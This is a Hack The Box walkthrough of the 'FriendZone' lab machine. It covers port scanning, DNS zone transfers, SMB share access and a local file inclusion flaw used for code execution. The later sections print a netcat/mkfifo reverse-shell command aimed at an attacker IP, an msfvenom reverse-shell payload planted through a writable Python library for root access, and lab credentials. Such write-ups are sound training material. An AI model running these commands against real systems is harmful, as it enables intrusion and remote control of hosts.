# FriendZone HTB

## Scanning

TCP:

```
nmap -sC -sV -vvv -O --top-ports 10000 10.10.10.123 -oA FZ
```

UDP: 

```
~/Tools/udp-proto-scanner/udp-proto-scanner.pl 10.10.10.123
```

## Checking results

We have 7 services to check:

- FTP (port 21)
- SSH (port 22)
- DNS (port 53)
- HTTP (port 80)
- NetBios (port 139)
- HTTPS (port 443)
- NetBios-SSN - Samba (port 445)

Based on these `nmap` scan results

```
21/open/tcp//ftp//vsftpd3.0.3/
22/open/tcp//ssh//OpenSSH7.6p1Ubuntu4(UbuntuLinux;protocol2.0)/
53/open/tcp//domain//ISCBIND9.11.3-1ubuntu1.2(UbuntuLinux)/
80/open/tcp//http//Apachehttpd2.4.29((Ubuntu))/
139/open/tcp//netbios-ssn//Sambasmbd3.X-4.X(workgroup:WORKGROUP)/
443/open/tcp//ssl|http//Apachehttpd2.4.29/
445/open/tcp//netbios-ssn//Sambasmbd4.7.6-Ubuntu(workgroup:WORKGROUP)/  IgnoredState:closed(8299)  SeqIndex:257     IPIDSeq:Allzeros 
```

## FTP

Running version (vsftpd 3.0.3 is not vulnerable to any commonly found exploits)

Doesn't allow for anonymous connections.

## SSH 

Requires credentials, we have no usernames currently, so we can't even use the `ssh_enum_users` script from Metasploit.


## DNS

We can get the domain name from a few places. 

It showed up in the `nmap` results, and if you browse to the site on port 80, there is an email address that matches the domain that appears in the `nmap` results.

Got a hit on UDPscan for this as well:

- DNSStatusRequest (port 53)
- DNSVersionBindReq (port 53)
- NBTStat (port 137) < new port

At this point modify the `hosts` file so we have the FQDN pointing at the IP

Can we do a zone transfer?

```
dig axfr friendzoneportal.red @friendzoneportal.red

; <<>> DiG 9.11.4-4-Debian <<>> axfr friendzoneportal.red @friendzoneportal.red
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800                                                                                                
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800                                                                                                
;; Query time: 43 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Wed Feb 13 17:37:22 GMT 2019
;; XFR size: 9 records (messages 1, bytes 309)
```

Yep!

Now we have a list of subdomains to check (on both port 80 and port 443)

Add them into the `hosts` file so we can browse to them.

- admin
- files
- imports
- vpn


## HTTP/S

Interestingly if we `curl` the main HTTPS page (i.e. no files requested) we get the following output:

```
<title>Watching you !</title>

<h2>G00d !</h2>

<img src="z.gif">
```

Probably worth checking out in the browser. 

(it's that gif of Michael Jackson eating pop-corn with what *could* be a password printed above it in a `h2` block)

(let's try that "password" as the credentials for FTP while we remember)... didn't work but was worth a try... 

```
curl -X GET http://admin.friendzoneportal.red
```

```
curl -X GET https://admin.friendzoneportal.red -k 
```

Add the `-k` so we ignore any SSL errors. 

Trying `admin` as the subdomain gets a hit on 443 but not 80

Nothing else is found (The Apache server just reports them all as 404's or does a redirect to the `index` file at the root of the website)

Tried some directory bruteforcing

The HTTP site (port 80) seems to only return that same index page no matter what you put into the URL field or `curl` request. 

Same for bruteforcing, they must have all non-HTTPS requests routing back to that main domain, no matter which sub-domain you use (best guess, will keep trying though)

```
wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 http://friendzoneportal.red/FUZZ
```

Results: 

```
000001:  C=200     12 L       31 W          324 Ch        ""
002020:  C=200     12 L       31 W          324 Ch        "index.html"
003436:  C=200      1 L        2 W           13 Ch        "robots.txt"
003588:  C=403     11 L       32 W          314 Ch        "server-status"
004471:  C=301      9 L       28 W          344 Ch        "wordpress"
000012:  C=403     11 L       32 W          310 Ch        ".htaccess"
000011:  C=403     11 L       32 W          305 Ch        ".hta"
000013:  C=403     11 L       32 W          310 Ch        ".htpasswd"
```

Bunch of 403's and some "troll" pages, the robots.txt just says "seriously?" (come on dude, you put a robots.txt file there I'm going to read it, don't act like you're l33t or something, its web security 101 check the robots.txt file) and the `wordpress` site is just a blank directory, har har har.

Moving on to things that were not put there specifically to waste peoples time and then mock them for it... 

Only thing of any use here is the domain name we grabbed from the email in index.html.

If we go to the admin subdomain at `https://admin.friendzoneportal.red` and ignore the certificate errors, we are greeted with a login script, when we enter our credentials it sends the data to `login.php` but we if we actually browse to it all we see is some "Zzzzzz". If we try to login with any credentials it just brings up a page that says:

```
Admin page is not developed yet !!! check for another one
```

"check for another one" is the phrase I'm taking away from this.

OK, so we've checked the following pages on the HTTP site:

- http://10.10.10.123/ < the main index where we get the email address from 
- http://friendzoneportal.red/ < same index, but with the domain instead of IP
- http://admin.friendzoneportal.red < redirects back to the main index
- http://files... < see admin
- http://imports... < see admin
- http://vpn... < see admin

And we've found the following on the HTTPS site:

- https://10.10.10.123 < 404'ed
- https://friendzoneportal.red < the gif and the (maybe) password
- https://admin.friendzoneportal.red < doesn't appear to work, tells us to look elsewhere for an admin portal
- https://files... < 404'ed 
- https://imports... < 404'ed
- https://vpn... < 404'ed

(It's begining to dawn on me that this may not be the way)

Just to confirm in a more succinct way I ran the following script:

```
import requests
import sys

https = sys.argv[1]

with open("wordlist") as wordlist:
	for w in wordlist:
		if https == "yes":
			req = requests.get("https://"+w.rstrip()+".friendzoneportal.red", verify=False)
		else:
			req = requests.get("http://"+w.rstrip()+".friendzoneportal.red")

		status = req.status_code
		print status

```

That produced the following results when ran for both HTTP and HTTPS (I'm not a dev don't judge my crappy code!)

```
python subdomainenum.py no                                          
200
200
200                                                       
200 
```

And for HTTPS:

```
python subdomainenum.py yes
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:860: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification
 is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  InsecureRequestWarning)
200
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:860: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification
 is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  InsecureRequestWarning)
404
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:860: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification
 is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  InsecureRequestWarning)
404
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:860: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification
 is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  InsecureRequestWarning)
404
```

Dem warnings though.

Anyway. 

Let's keep looking...

## DNS Again

OK, so something about the box being called "FriendZone" is itching the back of my brain, often times the box names are a hint, and in this case I think it may be true. We might have to do some more zone transfers.

> Got a tip from an old ippsec video on YouTube that if you see DNS coming back in the initial TCP scan then zone transfers are probably a thing. This is due to DNS only running on TCP when the response size is greater than 512 bytes (not exact but sounds reasonable). This is probably to prevent data loss in large zone transfers) 

Zone transfers are not usually possible!

We did one earlier. And got a few sub-domains back. 

The problem with this server is that it doesn't appear to have a valid NX (Name Server)

`nslookup` can't find it, neither can `dig`, `dnsrecon`, or `dnsenum`

> Another nice tip. Because we're dealing with a DNS server, we don't have to add the host names to /etc/hosts we can just add the server IP to /etc/resolv.conf (not in this case as the name server is invalid)

MASSIVE CORRECTION TIME!

It turns out I've misunderstood the concept of a "name server" and DNS can't really exist without one, it's kinda the whole point. 

The tip just above this one actually works. If we add `10.10.10.123` to our hosts file we can now query the nameserver and we don't get those errors anymore. Yay!




## SMB 

```
$ rpcclient -U "" 10.10.10.123
Enter WORKGROUP\'s password:
rpcclient $> srvinfo
        FRIENDZONE     Wk Sv PrQ Unx NT SNT FriendZone server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
rpcclient $> 
```

Tried `enumdomusers` got nothing back. 

```
rpcclient $> getdompwinfo
min_password_length: 5
password_properties: 0x00000000
```

Minimum length password if we have to bruteforce. 

```
 =========================================
|    Share Enumeration on 10.10.10.123    |
 =========================================
[V] Attempting to get share list using authentication

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME

```

```
smbclient -W 'WORKGROUP' //'10.10.10.123'/'general' -U''%'' -c dir 2>&1
```

Checking out some of the results from enum4linux (the thing that managed to do Share Enumeration)

Looks like we can access that "general" share, and there is a file in there call "creds.txt", no idea how to download it though. 

Holy hell that's some wonky syntax...

```
smbclient -W 'WORKGROUP' //'10.10.10.123'/'general'/ -U''%'' -c "prompt;recurse;get creds.txt;"
``` 

OK, so now we have some credentials, and all it says is "for the admin thing". We found one of those already, but it's dead. So where in the blazes do we find it? 

Back to smashing this thing with directory fuzzers I guess. 

> Side note: I love the fact that seemingly all tools use -k as a "Ignore HTTPS certificate errors" flag, using GOBuster for the first time instead of WFUZZ just to see if it finds something different. 

```
$ ./gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://admin.friendzoneportal.red -k -f-x php,txt,html
```



That got us the file though, but where to use it?


## A BREAKTHROUGH!

So after wasting a bunch of time fuzzing the same endpoints with different file types, I decided to give `dig` another go, and see what else we could find:

```
$ dig nx 10.10.10.123
```

Nothin...

```
$ dig axfr friendzoneportal.red @10.10.10.123
```

Same as before (as expected)

```
$ dig axfr friendzoneportal.htb @10.10.10.123
```

Worth a try, but nothing happening. 

```
$ dig axfr friendzone.red @10.10.10.123
```

Oh...

```
$ dig axfr friendzone.red @10.10.10.123      

; <<>> DiG 9.11.4-4-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 42 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Sun Feb 17 21:25:47 GMT 2019
;; XFR size: 8 records (messages 1, bytes 289)
```

Those are new!

We did a thing, OK it was purely by guess work, but hey we did it! 

So it's probably worth writing a little script to mutate (to a point) the TLD and see what else we can find at a given IP (DNS Server)



## Back to Web Enumeration

OK, so we have another bunch of endpoints to map out. We need to do the same as we did earlier and figure out what we can and can't hit on here. 

Scanning the base "friendzone.red"

```
/index.html (Status: 200)                                                                     │
/icons/ (Status: 403)                                                                         │
/admin/ (Status: 200)                                                                         │
/e.gif (Status: 200)                                                                          │
/js/ (Status: 200) 
```

Only one that had anything of interest was /js/ there was a directory there with a file that contained the following:

```
Testing some functions !

I'am trying not to break things !
dlVHeEVEdDI0UjE1NTA0Mzk2Njh6QmhpYlVDWGpX
```

Tried to decode that string, got something that looked like base64, but no == padding at the end. Ran it through the decoder again, and got either encrypted data, or jibberish. It's hard to tell sometimes...

We could also have found that `/js/js` page by checking the source on the admin page.


### Messing around with Admin

OK so we found those creds, and we've had multiple hints to find another admin, and here one is...

The creds get us straight in, no messing around.

Then we're told to go to "dashboard.php" although I'm still going to scan this thing, just to be sure. 

Found that the "pagename" parameter was vulnerable to LFI.

`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=login`

Upload the SHELL directly the the SMB share, moron.

user:a9ed20acecd6c5b6b52f474e15ae9a11

`/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'`

`cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.3+1223+>/tmp/f`

`https://administrator1.friendzone.red//dashboard.php?image_id=a.jpg&cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.3+1223+>/tmp/f&pagename=/etc/Development/backdoor`

Once we're on the box we can 

`friend:x:1000:1000:friend,,,:/home/friend:/bin/bash`

```
www-data@FriendZone:/var/www$ cat mysql_data.conf
cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

Used those credentials to log in via SSH. 

First we used [PsPy](https://github.com/DominicBreuker/pspy) to watch the processes that run as root

Spotted a python file being ran on a timer

Found that it imported the "os" module, and that the os.py module file was writable. 

```
import subprocess
subprocess.check_output(["/tmp/beeeep/iwconfig"])
```

"iwconfig" in this case is actually the following: 

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=1337 -f elf > iwconfig`

Initially we thought that there was a way to get through via MySQL. But that was just a rabbit hole.

